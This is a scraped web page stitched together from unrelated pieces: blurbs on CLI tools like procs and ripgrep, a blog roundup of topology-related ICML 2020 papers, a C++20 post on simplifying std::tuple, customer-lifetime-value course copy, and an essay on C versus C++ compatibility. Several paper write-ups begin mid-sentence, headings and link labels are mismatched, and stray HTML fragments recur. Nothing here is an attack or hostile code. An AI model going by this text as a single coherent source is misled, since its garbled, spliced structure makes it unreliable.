<p><img src="https://user-images.githubusercontent.com/200613/90223646-bbce7680-de0e-11ea-98f4-0ef2d5f30920.png" alt="fd"></p>
<p><a href="https://github.com/sharkdp/fd">GitHub</a></p>
<h2 id="procs"><code>procs</code></h2>
<p><code>procs</code> is a modern replacement for <code>ps</code>, the default command-line program in Unix/Linux for getting information about processes. It provides convenient, human-readable (and colored) output format by default.</p>

<p><a href="https://starship.rs/guide/">GitHub</a></p>
<h2 id="ripgrep"><code>ripgrep</code></h2>
<p><code>ripgrep</code> is an extremely fast alternative to <code>grep</code>, the built-in command-line program in Unix/Linux for searching files by pattern. <code>ripgrep</code> is a line-oriented search tool that recursively searches your current directory for a regex pattern. By default, ripgrep respects <code>.gitignore</code> and automatically skips hidden files, directories and binary files.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223748-ecaeab80-de0e-11ea-9140-ac9219f5747c.gif" alt="ripgrep"></p>

        <p>With this year’s <a href="https://icml.cc/Conferences/2020">International Conference on Machine Learning&nbsp;(ICML)</a>
being over, it is time to have another instalment of this series.
Similar to <a href="http://bastian.rieck.me/blog/posts/2019/icml_tda_roundup/">last year’s post</a>, I shall cover
several papers that caught my attention because of their use of
topological concepts—however, <em>unlike</em> last year, I shall not
restrict the selection to papers using <a href="https://en.wikipedia.org/wiki/Topological_data_analysis">topological data analysis&nbsp;(TDA)</a>.</p>
<p><strong>Caveat lector:</strong> I might have missed some promising papers. Any
suggestions for additions are more than welcome! Please reach out
to me via <a href="https://twitter.com/Pseudomanifold">Twitter</a> or

<p><a href="https://arxiv.org/abs/2002.04881">Learning Flat Latent Manifolds with VAEs</a>
by <a href="https://argmax.ai/team/nutan-chen">Nutan Chen</a>, <a href="https://www.argmax.ai/team/alexej-klushyn">Alexej Klushyn</a>,
Francesco Ferroni, <a href="http://bayerj.github.io/">Justin Bayer</a>, and
<a href="https://argmax.ai/team/patrick-van-der-smagt">Patrick van der Smagt</a>
discusses an interesting modification of variational autoencoders, viz.
an extended loss term that regularises the latent space to be
<em>flat</em>&nbsp;(i.e. having no <a href="https://en.wikipedia.org/wiki/Curvature">curvature</a>).
The main idea is to ensure that the <a href="https://en.wikipedia.org/wiki/Metric_tensor">Riemannian metric tensor</a>
is the identity matrix.</p>
<p>The ingenious implication of such a latent space is that the Euclidean
distance is a good proxy for the similarity between data points, whereas
this is <em>not</em> a priori the case for other latent spaces. It is interesting
to note that there is a ‘sibling’ paper to this one, which was published
at ICLR 2020, namely <a href="https://openreview.net/pdf?id=S1g6xeSKDS">Mixed-curvature Variational Autoencoders</a>.
This paper presents an autoencoder whose latent space is a product of
Riemannian manifolds, whose curvature is either fixed or learnable.</p>
<p>I am glad to see that curvature is starting to attract more attention
from the machine learning community. It is such a fundamental property
of a manifold but can influence the validity of many calculations in
latent spaces. It also has some beneficial properties for <a href="https://openreview.net/pdf?id=BylEqnVFDB">graph
classification</a>, but this is
maybe a better topic for a subsequent post!</p>

<a href="https://rkwitt.github.io/">Roland Kwitt</a> is arguably<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> the first step
towards properly integrating topological features into neural networks
for graph classification! Briefly put, we developed a homological
<code>READOUT</code> function&nbsp;(to use the parlance of graph neural networks)
that gives rise to a learnable filter function—a <em>filtration</em>.</p>
<p>This concept might be unknown to some readers, but a filtration in this
context is a scalar-valued function on the vertices of a graph that
permits <em>sorting</em> it. Filtrations serve as the backbone for many
topology-based algorithms, primarily for the aforementioned <a href="https://christian.bock.ml/posts/persistent_homology/">persistent homology</a>,
which permits us to study multi-scale topological
features&nbsp;(connected components, cycles, etc.) of an object.
Prior to this paper, filtrations were pre-defined or chosen based on
some target function, such as the vertex degree function of a graph. Our
approach changes this—leading to a filtration that is learnable in an
end-to-end fashion and thus specifically designed for a classification
problem.</p>
<p>We manage to achieve this by first initialising our filter function
based on a regular graph neural network; essentially, one level of
message passing between nodes is sufficient. This provides us with
a non-trivial filter function whose performance we can subsequently
adjust by calculating the topological features induced by said filter,
and vectorising the resulting representations. Since each of these steps
is differentiable<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, the resulting function is also differentiable,
making it possible to adjust the filter for the best classification
results.</p>
<p>I would recommend this paper to anyone who is interested in learning
more about the benefits that a topology-based perspective brings to
certain application problems. Being able to learn the <em>right</em> topological features
to classify a set of graphs opens up exciting opportunities.</p>

by <a href="https://www.researchgate.net/profile/Christoph_Hofer8">Christoph Hofer</a>,
<a href="https://www.uni-salzburg.at/index.php?id=213185&amp;L=1">Florian Graf</a>,
<a href="http://wwwx.cs.unc.edu/~mn/?q=content/overview">Marc Niethammer</a>, and
<a href="https://rkwitt.github.io/">Roland Kwitt</a> studies regularisation properties of
over-parametrised neural networks in the context of small sample-size learning.
This is achieved by studying the properties of latent
representations&nbsp;(the paper uses the term <em>internal representation</em>,
but this is equivalent). More precisely, generalisation properties are
analysed via the <a href="https://en.wikipedia.org/wiki/Pushforward_measure">push-forward probability measure</a>
induced by the latent representation&nbsp;(or <em>encoding</em>).</p>
<p>The authors show that probability mass concentration around training
samples in the latent space is linked to the generalisation capabilities
of a model, but, even more exciting, such a concentration can be achieved by applying
topological constraints on samples from that space! In the context of
this paper, such constraints pertain to measuring the <em>connectivity</em> of
samples. This is achieved using <a href="https://christian.bock.ml/posts/persistent_homology/">persistent homology</a>, specifically,
by calculating a zero-dimensional Vietoris–Rips complex—if you are
not familiar with this term, just think of a minimum spanning tree.</p>
<p>What I particularly enjoyed about this paper is that it starts providing
solid answers to fundamental concepts in machine learning. All too often,
we remain in the realm of the empirical and just <em>observe</em> whether our
network generalises. This paper ventures into hitherto-unknown territories
and gives us a theoretical justification!</p>

<a href="https://bastian.rieck.me/">Bastian Rieck</a>, and
<a href="https://bsse.ethz.ch/mlcb/karsten.html">Karsten Borgwardt</a> deals with
regularising the latent space in terms of its topology. More precisely,
we preserve the topological features of the input data in the respective
latent space&nbsp;(on the batch level, respectively). While we restrict
our experiments to connected components for now&nbsp;(so no cycles
yet, even though our method generalises to higher dimensions),
our approach makes it possible to create latent representations
that ‘mimic’ the topological features of the input.</p>
<p>This leads to a nice plug-and-play loss term that can be easily
integrated into most architectures, and we can demonstrate that, among
others, it considerably improves the quality of a ‘vanilla’ autoencoder
architecture. To achieve this goal, we had to solve all kinds of
interesting adventures, one of them being how to make everything
differentiable. Interestingly, we end up with a similar necessary
condition for differentiability than for the graph filtration learning
paper, viz. the pairwise distances between different samples of the
input batch need to be <em>unique</em>.</p>
<p>The coolest feature of our method is that it technically <em>only</em> requires
a distance metric between input samples<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, nothing more—no feature
vector representation or anything. It can thus conceivably be used to
represent the topology of any object you fancy&nbsp;(including
documents, images, and graphs).</p>

present a novel method for calculating normalising flows on more complex
spaces than the usual Euclidean ones. Specifically, as the title
implies, they develop methods for calculating such flows on tori and
spheres.</p>
<p>What I enjoyed about this paper is the smart way of constructing flows
iteratively: first, flows on the circle are being constructed&nbsp;(using
different concepts for defining a <a href="https://en.wikipedia.org/wiki/Diffeomorphism">diffeomorphism</a>, the most favourite of
mine being a <a href="https://en.wikipedia.org/wiki/M%C3%B6bius_transformation">Möbius transformation</a>).
Since a torus can be described as the Cartesian product of circles, this
is sufficient to describe flows on tori of arbitrary dimensions! Next,
the flows are generalised to higher-dimensional spheres.</p>
<p>While I am by no means and expert in normalising flows, I liked
reading this paper a lot. The theory is well-developed and it is another
one of those publications that shows you how to go beyond the boundaries
of what is currently possible. Moreover, I enjoyed the discussion of the
implementation details—it turns out that achieving numerical stability
here is another feat that deserves some mention!</p>

<p>This year’s ICML also featured an interesting array of topology-based
papers. Not all of them fit neatly into the field of topological data
analysis&nbsp;(TDA), but I am happy to see that the community is
starting to pick up this fundamental topic. I remain convinced that
a topology-driven perspective is needed to answer certain foundational
questions in machine learning. Here’s to the future of topology!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>When he created Go as a knee-jerk Reaction to C++11,
Rob Pike proclaimed <a href="https://commandcenter.blogspot.com/2012/06/less-is-exponentially-more.html">Less is exponentially more</a>.
While it is anyone’s guess what that is supposed to mean, in this blog post we will see how C++20 is less verbose, yet more expressive than
prior C++ versions.</p>
<p>I am a big fan of concepts-driven designs.
The use of concepts leads to less coupled, more generic interfaces that work with more types.
Take <code>std::tuple</code> for example. A tuple can be constructed from a <code>std::pair</code>. But it can’t be
constructed from a <code>QPair</code> or a <code>boost::tuple</code>. Nor can it be constructed from a <code>std::array</code>,
even if <code>std::array</code> follows the tuple protocol.
Isn’t that a bit arbitrary?</p>
<p>Shouldn’t instead construction and comparison support all objects following the tuple protocol?
Especially for comparison, if a different part of my system uses a different tuple type (of the same arity),
why should I need to do an expensive conversion to compare their <strong>value</strong> ?</p>
<p>A better question, of course, would be <em>why is <code>std::pair</code> a distinct type from <code>std::tuple</code>?</em>, the answer to that
being <em>legacy</em>, as always. Could we fix it? Probably not.</p>
<p>But anyway, this led me to propose <a href="https://wg21.link/p2165">P2165 - Comparing pair and tuples</a>.
This, in turn, led me to look at libstdc++'s tuple implementation.
That is the topic of today’s blog post.</p>
<p><code>std::tuple</code> is a C++11 addition, and like many standard types, its goal of being a universal
vocabulary type makes it quite challenging to implement.</p>
<p>You can also checkout <a href="https://medium.com/@mortificador/implementing-std-tuple-in-c-17-3cc5c6da7277">this article</a>
which explain how <code>std::tuple</code> is implemented in C++17.</p>
<p>But since then the language changed a lot, and many new features target easier library development.
Let see how C++20 can help us simplify <code>std::tuple</code>'s implementation.</p>
<h3 id="down-with-ebo">Down with EBO</h3>
<p><code>std::tuple</code> can be implemented as a recursive tuple.</p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span> {
    T type;
};

<span>template</span> &lt;<span>int</span> index, <span>typename</span> T, <span>typename</span>... Tail&gt;
<span>struct</span> <span>Tuple</span>
    : Wrapper&lt;T, index&gt;
    , Tuple&lt;index + <span>1</span>, Tail...&gt;
{
};
</code></pre></div><p>Unfortunately, we do need to explicitly define constructors to be able
to use that type, which ends up with 14 or so constructors and a few assignment operators.
Half of those being for allocator support.</p>
<p>On top of that, libstdc++ optimises for empty types:</p>
<div><pre><code data-lang="cpp"><span>struct</span> <span>empty</span>{};
<span>static_assert</span>(<span>sizeof</span>(std::tuple&lt;empty, empty&gt;) == <span>1</span>);
</code></pre></div><p>To that end, it implements <a href="https://en.cppreference.com/w/cpp/language/ebo">empty base class optimization</a></p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span> T, <span>int</span> index, <span>bool</span> <span>/* is the class empty */</span>&gt;
<span>struct</span> <span>Wrapper</span>;

<span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span>&lt;T, index, std::is_empty_v&lt;T&gt;&gt; {
    <span>// LOTS OF CONSTRUCTORS
</span><span></span>};

<span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span>&lt;T, index, !std::is_empty_v&lt;T&gt;&gt; {
    <span>// LOTS OF CONSTRUCTORS
</span><span></span>    T type;
};

<span>template</span> &lt;<span>int</span> index, <span>typename</span> T, <span>typename</span>... Tail&gt;
<span>struct</span> <span>Tuple</span>
    : Wrapper&lt;T, index&gt;
    , TupleImpl&lt;index + <span>1</span>, Tail...&gt;
{
    <span>// LOTS OF CONSTRUCTORS
</span><span></span>};
</code></pre></div><p>The actual libstdc++ implementation is a bit more complicated still.
Overall, about 70 lines of code - mostly duplicated - are there to
support empty objects.
This small optimization is, therefore, anything but free in terms of maintenance.
It also has some compilation cost, as more templates need to be instantiated.
Is it even worth it?</p>
<p>In C++20 all of that complexity goes away:</p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span> {
    <span>[[no_unique_address]]</span> T type;
};

<span>template</span> &lt;<span>int</span> index, <span>typename</span> T, <span>typename</span>... Tail&gt;
<span>struct</span> <span>TupleImpl</span>
    : Wrapper&lt;T, index&gt;
    , TupleImpl&lt;index + <span>1</span>, Tail...&gt;
{
};
</code></pre></div><p><code>[[no_unique_address]]</code> gives us the same optimization as Empty-Base-Class-Optimization,
without adding any complexity to our design.
Less code, more expressiveness, less maintenance.</p>
<h3 id="c20-is-more-implicit-about-being-explicit">C++20 is more implicit about being explicit.</h3>
<p>Like watermelons are mostly water, <code>std::tuple</code> is mostly constructors.
I counted 24 constructors in libstdc++'s implementation.
Let’s remove some.</p>
<p>The standard specifies that a tuple constructor is explicit if any of its
elements would have an <code>explicit</code> constructor.</p>
<div><pre><code data-lang="cpp"><span>struct</span> <span>S</span> {};
<span>struct</span> <span>E</span> { <span>explicit</span> <span>E</span>(S); };
<span>struct</span> <span>I</span> { I(S); };

std::tuple&lt;E&gt; x = S{};  <span>// ill-formed
</span><span></span>std::tuple&lt;I&gt; x = S{};  <span>// OK
</span></code></pre></div><p>Pretty neat. But how does it work ?</p>
<p>Simply by having defining 2 constructors,
one explicit and one not, and SFINAE away the one that should not be considered:</p>
<div><pre><code data-lang="cpp"><span>template</span>&lt;<span>bool</span> _Cond, <span>typename</span>... _Args&gt;
<span>using</span> _ImplicitCtor =
    __enable_if_t&lt;_TCC&lt;_Cond&gt;::<span>template</span> __is_implicitly_constructible&lt;_Args...&gt;(), <span>bool</span>&gt;;

<span>template</span>&lt;<span>bool</span> _Cond, <span>typename</span>... _Args&gt;
<span>using</span> _ExplicitCtor =
    __enable_if_t&lt;_TCC&lt;_Cond&gt;::<span>template</span> __is_explicitly_constructible&lt;_Args...&gt;(), <span>bool</span>&gt;;


<span>template</span>&lt;<span>bool</span> _NotEmpty = (<span>sizeof</span>...(_Elements) &gt;= <span>1</span>),
    _ImplicitCtor&lt;_NotEmpty, <span>const</span> _Elements&amp;...&gt; = <span>true</span>&gt;
<span>constexpr</span> tuple(<span>const</span> _Elements&amp;... __elements);

<span>template</span>&lt;<span>bool</span> _NotEmpty = (<span>sizeof</span>...(_Elements) &gt;= <span>1</span>),
    _ExplicitCtor&lt;_NotEmpty, <span>const</span> _Elements&amp;...&gt; = <span>false</span>&gt;
<span>explicit</span> <span>// This is the explicit constructor
</span><span></span><span>constexpr</span>
tuple(<span>const</span> _Elements&amp;... __elements);
</code></pre></div><p>And this is for every single constructor!
Don’t worry, this is not the way, for in C++20 <code>explicit</code> was amended to support another form: <code>explicit(boolean-expression)</code>.
As such, <code>explicit(true)</code> is equivalent to <code>explicit</code> while <code>explicit(false)</code> is not explicit.
We can then rewrite the above code as:</p>
<div><pre><code data-lang="cpp"><span>template</span>&lt;<span>bool</span> _NotEmpty = (<span>sizeof</span>...(_Elements) &gt;= <span>1</span>)&gt;
<span>explicit</span>(is_explicit_v&lt;<span>const</span> _Elements&amp;...&gt;)
<span>constexpr</span>
tuple(<span>const</span> _Elements&amp;... __elements);
</code></pre></div><p>This little trick lets us remove about 10 constructors and about 150 lines of codes. Don’t reinvent yourself!</p>
<h3 id="constrained-copy-pasta">Constrained copy-pasta</h3>
<p>With so many constructors, <code>std::tuple</code> is a template SFINAE bonanza.
So it is not surprising that the best way to improve <code>std::tuple</code> is to go all-in on C++ concepts.
Or rather, on <code>requires</code> clauses.</p>
<p>This is the code in libstdc++ for the default constructor:</p>
<div><pre><code data-lang="cpp"><span>template</span>&lt;<span>typename</span> _Dummy = <span>void</span>, _ImplicitDefaultCtor&lt;is_void&lt;_Dummy&gt;::value&gt; = <span>true</span>&gt;
<span>constexpr</span>
tuple()
<span>noexcept</span>(__and_&lt;is_nothrow_default_constructible&lt;_Elements&gt;...&gt;::value);
</code></pre></div><p>It can be rewritten using a <code>requires</code> clause easily: No <code>std::enable_if</code> wizardry.</p>
<div><pre><code data-lang="cpp"><span>explicit</span>(!(__and_&lt;__is_implicitly_default_constructible&lt;_Elements&gt;::value...&gt;::value))
<span>constexpr</span> tuple()
<span>noexcept</span>((__and_&lt;is_nothrow_default_constructible&lt;_Elements&gt;::value...&gt;::value))
<span>requires</span>((__and_&lt;std::is_default_constructible&lt;_Elements&gt;::value&gt;...&gt;::value));
</code></pre></div><p>If we look at the standard, the code above is a direct translation of the wording!
Each <code>Constraint</code> in the wording draft can be converted to a C++ constraint!</p>
<p><img src="https://cor3ntin.github.io/posts/tuple/ctr1.png" alt="Example image"></p>
<p>One other thing we should do is to use fold expressions and template variables to cut down
on the clutter. Both these are actually C++17 features!</p>
<div><pre><code data-lang="cpp"><span>explicit</span>(!(__is_implicitly_default_constructible_v&lt;_Elements&gt; &amp;&amp;...))
<span>constexpr</span> tuple()
<span>noexcept</span>((std::is_nothrow_default_constructible_v&lt;_Elements&gt; &amp;&amp;...))
<span>requires</span>((std::is_default_constructible&lt;_Elements&gt; &amp;&amp;...));
</code></pre></div><p>Because <code>requires</code> clauses make it a lot easier to express constraint, and allow us to
implement the standard line by line, we can remove a lot of code while increasing
readability!</p>
<p>You could wonder about the cost of all these concepts on compile-time,
that would be very legitimate indeed.
Concepts are in fact a bit taxing on compilers.
They are however not as costly than the equivalent <code>enable_if</code> machinery,
so these transformations end up having no negative impact on compile times.</p>
<h3 id="a-pair-by-any-other-name-would-compile-just-as-fast">A pair by any other name would compile just as fast</h3>
<p>Because a tuple is constructible from a <code>std::pair</code>, libstdc++ elects to specialize tuple for 2
elements, for the sake of these additional constructors.
But what is a pair, if not a tuple?
Following this logic, we could remove that entire specialization, a whopping 360 lines of code.
So satisfying!</p>
<p>We could also keep the constructors for pair by simply adding a <code>requires (sizeof...(_Elements) == 2)</code>
to these constructors, no need for specialization!</p>
<h3 id="-nothing-as-futuristic-as-a-spaceship">🛸 Nothing as futuristic as a spaceship!</h3>
<p>Tuple provides all the comparison operators which are implemented in about 100 lines of code.
We can replace them by 2 functions, <code>operator==</code> and <code>operator&lt;=&gt;</code>:</p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span>...Elem, <span>typename</span>...OElem, <span>template</span> &lt;<span>typename</span>...&gt; <span>typename</span> B&gt;
<span>requires</span> (tuple_like&lt;B&lt;OElem...&gt;&gt;  &amp;&amp; <span>sizeof</span>...(Elem) == <span>sizeof</span>...(OElem))
<span>bool</span> <span>operator</span>==(<span>const</span> tuple&lt;Elem...&gt; &amp; a, <span>const</span> B&lt;OElem...&gt; &amp; b) {
    <span>return</span> [&amp;]&lt;std::size_t... I&gt;(index_sequence&lt;I...&gt;)
    {
        <span>return</span>  ((std::get&lt;I&gt;(a) == std::get&lt;I&gt;(b)) &amp;&amp; ...);
    }
    (std::make_index_sequence&lt;<span>sizeof</span>...(Elem)&gt;{});
}

<span>template</span> &lt;<span>typename</span>...Elem, <span>typename</span>...OElem, <span>template</span> &lt;<span>typename</span>...&gt; <span>typename</span> B&gt;
<span>requires</span> (tuple_like&lt;B&lt;OElem...&gt;&gt;  &amp;&amp; <span>sizeof</span>...(Elem) == <span>sizeof</span>...(OElem))
<span>auto</span> <span>operator</span>&lt;=&gt;(<span>const</span> tuple&lt;Elem...&gt; &amp; a, <span>const</span> B&lt;OElem...&gt; &amp; b) {
    <span>using</span> ret = common_comparison_category_t&lt;__detail::__synth3way_t&lt;Elem, OElem&gt;...&gt;;
    <span>return</span> [&amp;]&lt;std::size_t... I&gt;(index_sequence&lt;I...&gt;)
    {
        ret c = ret::equivalent;
        <span>// http://eel.is/c++draft/expos.only.func#2
</span><span></span>        <span>return</span>  ((c = synth3way(std::get&lt;I&gt;(a), std::get&lt;I&gt;(b)), c != <span>0</span>) || ...), c;
    }
    (std::make_index_sequence&lt;<span>sizeof</span>...(Elem)&gt;{});
}
</code></pre></div><p>Both these functions will support comparing a tuple to any <em>tuple-like</em> object.
They could be hidden friends, which would improve compile times, if not for the dependency
on <code>std::get</code>.</p>
<p>To implement them, I have used a few C++20 features.
Notably, generic lambdas, which are of the form: <code>[]&lt;_template-parameters_&gt;(){}</code>.
These allow us to unpack the tuple to make use of fold expressions directly in the functions.
Notice also the <code>requires</code> clause.
In the definition of <code>operator&lt;=&gt;</code> a nasty comma expression is used to return when 2
elements compare equal.
I understand this style might appear novel, maybe even scary, but properly documented
it is easier to document than something which relies on a lot of <code>enable_if</code> and other meta-programming heavy
approaches.</p>
<p>Interestingly these functions are not constrained by the standard.</p>
<h2 id="we-cant-have-nice-things">We can’t have nice things</h2>
<p>Using these tricks, I shaved over 700 lines from <code>&lt;tuple&gt;</code>; Almost a third.
And I am sure tons of improvements could still be made.
I probably introduced a few bugs doing this experiment, but I feel like I made the …</p></div></div>

Let’s get into the data science behind customer lifetime value. There are several ways to calculate CLV, with models differing in accuracy at the aggregate and individual levels. Some models require historical data, while others can predict CLV early in the customer journey.
This course begins with the basics of customer lifetime value, then it dives deeper into various models for calculating and predicting CLV.

Let’s start at the beginning. Customer Lifetime Value (CLV) is a metric that estimates how much value (usually revenue or profit margin) any given customer will bring to your business over the course of the total time they interact with your brand—past, present, and future.
This course is an introduction to CLV for business analysts, c-suite executives, growth marketers, data scientists, and anyone in between.

<p>
<h3>What Is Customer Lifetime Value?</h3>
</p>
<p>
The very first course in the CLV Academy provides an overview of customer lifetime value. What is it? Why is it important? What problems can CLV solve for your business? You can dive deeper into many of these ideas in later lessons.

<p>
<h3>Why Calculate CLV at the Individual Level</h3>
</p>
<p>
The most commonly used customer lifetime value models benchmark their strengths on aggregate statistics. Yet, most business use cases for CLV require accuracy at the individual level. You can see the problem.

Customer Lifetime Value demonstrates who your best customers are and what they have in common. How would your strategies change if you could predict which audiences will remain loyal to your brand for years to come?
This course provides business applications of CLV for acquisition, retention, product management, customer service, and more.

<h3>Lookalike Strategies Powered by CLV</h3>
</p>
<p>
Ad platforms allow advertisers to target new users with lookalike audiences. However, the out-of-the-box solution falls short because all of your customers aren’t alike. With customer lifetime value, you can create more effective lookalike audiences for acquisition.

<p>
<h3>Optimize Your Marketing Budget</h3>
</p>
<p>
Between acquisition and retention campaigns to content marketing and brand development, it’s difficult to know where to spend your limited marketing dollars. Individual customer lifetime value metrics take the guesswork out of budgeting so you can optimize your spend in real time.

</span>
</p>
<p>
<h3>CLV Migration Over Time</h3>
</p>
<p>
Customer lifetime value is not a static metric. It changes over time—sometimes dramatically—as you observe new data about a customer. By tracking how CLV changes over time, you can determine what product features, retention campaigns, customer service practices, and more impact lifetime value.

</span>
</p>
<p>
<h3>Lifecycle Marketing Strategies</h3>
</p>
<p>
Don’t over-optimize your retention strategy; rather, acquire the right customers in the first place. Design a marketing strategy for customers throughout their lifecycle, from acquisition to retention.

</span>
</p>
<p>
<h3>CLV-Driven Product Insights</h3>
</p>
<p>
You can use customer lifetime value metrics to enrich and inform your product marketing strategy. What if you knew which products high-value customers bought first? Or which products you should offer as a bundle or upsell?

September 1, 2020 | https://cor3ntin.github.io/posts/c/ | <a href="https://web.archive.org/web/*/https://cor3ntin.github.io/posts/c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://cor3ntin.github.io/posts/c/fight.jpeg" alt="Fish"></p>
<p>In the early 70s, C was created at Bell Labs as a byproduct of the development of UNIX.
It quickly became one of the most popular programming languages.
But it was not expressive enough for Bjarne Stroustrup.
And so, in 1983, as a byproduct of his Ph.D. thesis, he extended C.</p>
<p>C with classes was born.</p>
<p>At the time, Bjarne Stroustrup understood that a programming language has many components,
not only the language, its compiler, but also a linker and libraries.
Offering a familiar tool also makes adoption easier.
In this historical context, it makes sense that C++ would be based on C.</p>
<p>Fast-forward 40 years later.</p>
<p>Both C and C++ are widely used in the industry.
But go 5 minutes on the Internet and C developers will tell you that C++ is the most horrific man-made creation,
while many C++ developers wait for the day when C finally burns in the hot flames of hell.</p>
<h2 id="so-what-happened">So what happened?</h2>
<p>On the surface, C and C++ cater to the same use cases: high performance, deterministic, native but portable code for the widest range of hardware and applications.</p>
<p>But C is proudly a low-level language. A nicer assembly.</p>
<p>From day one, C++ had magic. Dark witchcraft: destructors. Suddenly the compiler was doing things on its own.
It also had type inference very early on, but the developers of the mid-80s were not quite ready for that and Bjarne Stroustrup
was pressured into removing <code>auto</code>, until it was added back to C++11.</p>
<p>From then, C++ got more and more tools to build abstractions.
I don’t think it would be fair to say that C++ is a low-level or high-level language. It’s both, by design.
But building high-level abstractions while not sacrificing performance is hard.
C++ then needed tools to achieve that: <code>constexpr</code>, move semantics, templates, and an ever-growing standard library.</p>
<p>Fundamentally I think C trusts developers while C++ trusts compilers.
This is a massive difference that sharing the same native types or syntax for while loop cannot hide.</p>
<p>C++ developers blame C for all their lost limbs, while C developers probably think C++ is batshit crazy.
I imagine that is a fair perspective if you look at C++ through a C lense. C++ is pretty wild <em>as a superset of C</em>.
A seasoned C person looking at C++ expecting familiarity in C++ will not find it. C++ is not C.
This is enough to feed flamewars for generations.</p>
<p>But as much as I dislike C, I don’t have any legitimacy to make fun of it. See, I have some experience with C++ but I
wrote very little C. It was probably bad C.
A language is also its good practices, patterns, idioms, and these take years to learn. If you try to write C code like it’s C++ or C++ like it is C, you will have a bad time.
Knowing <a href="https://www.youtube.com/watch?v=YnWhqhNdYyk">C doesn’t teach you C++</a>. Knowing C++ does not teach you C.</p>
<p>So can we all stop saying C/C++, regret the unfortunate naming, and sing kumbaya in harmony?
Not so fast.</p>
<p>See, despite being philosophically different from C, C++ is still somewhat a superset of C.
That is to say, you can include a C header in a C++ translation unit and that should compile.
And this is where it gets messy.</p>
<p>C++ is not an extension of C.
It is designed as a separate standard, by a different committee, different people.
Logically, people who like C++'s philosophy will get involved in the C++ community and the C++ standardization process
while other people might try to get involved with C.
Committees, whether its C’s or C++'s, only manifest intent and direction through their respective end-product: the standards; standards which are the fruits of numerous voting.</p>
<p>At the same time, it is difficult for a compiler to know that it is dealing with a C header or a C++ header.</p>
<p><code>extern "C"</code> is not used consistently and only affects mangling, but neither grammar nor semantics.
And headers only exists in the eyes of the preprocessor, for a C++ compiler, everything is a C++ translation unit, and therefore C++.
And yet, people include C headers in C++ and expect it to “just work” ™️.
Which it mostly does.</p>
<p>We can wonder then,</p>
<h2 id="how-c-maintains-c-compatibility-while-being-developed-by-different-people-in-different-places">How C++ maintains C compatibility while being developed by different people in different places?</h2>
<p>Badly, I’m afraid.</p>
<p>A coworker recently reminded me of Conway’s law:</p>
<blockquote>
<p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure</p>
</blockquote>
<p>By that logic, it would stand to reason that if the two committees don’t interoperate,
neither would the languages they produce.</p>
<p>C++ maintains a list of <a href="http://eel.is/c++draft/diff.iso">incompatibilities with C</a> and <a href="http://eel.is/c++draft/diff.library">its standard library</a>.
This list does not seem to reflect the many features that were added to C11 and C18 but are not valid C++ constructs. <a href="https://en.wikipedia.org/wiki/Compatibility_of_C_and_C%2B%2B">Wikipedia</a> draws a clearer picture.</p>
<p>Listing incompatibilities isn’t sufficient to get a measure of incompatibilities between both languages.</p>
<p>Functions that exist in the C++ standard library but whose primary declaration is expected to come from C are difficult to make <code>constexpr</code>, and more difficult still to make <code>noexcept</code>.
C compatibility translates to performance costs and C functions are optimization barriers.</p>
<p>Many C constructs are valid C++ but should never pass a code review (<code>NULL</code>, <code>longjmp</code>, <code>malloc</code>, create/destroy functions, <code>free</code>, C  casts), etc.</p>
<p>These might not be bad C idioms, but they are bad C++. C++ has a stronger type system,
and unfortunately using C idioms punch a giant hole in that type system, and so C compatibility has a cost in terms of safety.</p>
<p>Don’t get me wrong, C++ still care about C compatibility. Somewhat.
And interestingly C cares about C++. Somewhat.
Truth be told, C might care about C++ more than C++ cares about C.
So each committee cares somewhat about what the other does.
We care reluctantly.</p>
<p>See, C++ is aware of the many foundational libraries written in C, not only the <code>libc</code> but also <code>zip</code>, <code>png</code>, <code>curl</code>, <code>openssl</code> (!), and countless others, which are used in many, many C++ projects.
We can’t break that.</p>
<p>But recently, especially over the past decade, C++ has become much bigger than C.
C++ has more users - and a much more active community: <a href="https://nullprogram.com/blog/2018/11/21/">There Are No C Conferences</a>.
Maybe that’s why the C++ committee is now over 10 times the size of the C committee.</p>
<p>C++ then is a force to be reckoned with and the C committee has to consider not breaking C++.
To the point that if a standard would track another, these days, C++ leads and C follow.</p>
<p>C++ is now on a steady three years cycle come rain or shine, or deadly pandemics.
Meanwhile, C has a major release every decade or so.
This makes sense. As a lower-level language, C doesn’t need to evolve as fast.</p>
<p>The C landscape is also rather different from the C++ landscape.
C caters to more platforms and a lot more compilers.
Everybody and their dog is writing C compilers because the language has a surface area small enough to make that possible, whereas the C++ committee will only really consider 4 implementations, all of which are represented at every meeting.
As a result, many features in C are implementation-defined or optionally supported so that the variety of compilers that exist can claim conformance without doing much work, which I’m told pleases regulatory bodies.</p>
<p>C++ these days is more interested in portability than implementation freedom. Yet another difference of philosophy.</p>
<h2 id="so-your-proposal-breaks-c-compatibility">So, your proposal breaks C compatibility</h2>
<p>Parts of my <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2178r1.pdf">P2178</a> paper theoretically affects C compatibility.
In such cases, none of the options seems satisfactory.</p>
<p>You could be told that you have to first get your feature into C. Which means more meetings.
Meetings you might not be able to attend because C has strict <a href="https://thephd.github.io/follow-the-river-wg14-ithaca-2019">attendance rules</a> - Excluding individuals not willing to put down thousands of dollars to become ISO members.
This is because the C committee is forced to adhere strictly to ISO rules.</p>
<p>It might also take a decade if the standard just shipped.
And most importantly, it might go nowhere if the C committee doesn’t understand or doesn’t care about the particular problem you are trying to solve.
And they probably don’t have the bandwidth to deal with it.
And you may not have the bandwidth to deal with C. After all, you joined C++ to improve C++.
